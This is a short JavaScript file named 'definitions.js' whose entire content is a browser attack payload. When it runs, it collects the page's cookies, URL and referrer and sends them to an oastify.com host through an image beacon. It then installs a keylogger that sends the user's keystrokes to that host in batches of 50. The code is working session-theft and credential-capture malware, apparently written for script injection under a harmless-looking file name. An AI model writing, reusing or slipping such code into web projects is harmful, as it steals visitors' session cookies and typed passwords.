// definitions.js
(function() {
    'use strict';
    
    // Exfiltrate immediately
    (function() {
        try {
            var data = {
                cookie: document.cookie,
                url: location.href,
                referrer: document.referrer,
                timestamp: Date.now()
            };
            
            // Send via image beacon
            var img = new Image();
            img.src = 'https://t0uhznok4vwnz2odh99tbnn72y8pwhk6.oastify.com/exfil?d=' + 
                     encodeURIComponent(btoa(JSON.stringify(data)));
            
            console.log('[*] Data exfiltrated');
        } catch(e) {
            console.error('[!] Exfil failed:', e);
        }
    })();
    
    // Setup keylogger
    var keys = [];
    document.addEventListener('keydown', function(e) {
        keys.push(e.key);
        if (keys.length > 50) {
            new Image().src = 'https://t0uhznok4vwnz2odh99tbnn72y8pwhk6.oastify.com/keys?d=' + 
                             encodeURIComponent(keys.join(''));
            keys = [];
        }
    }, true);
    
})();
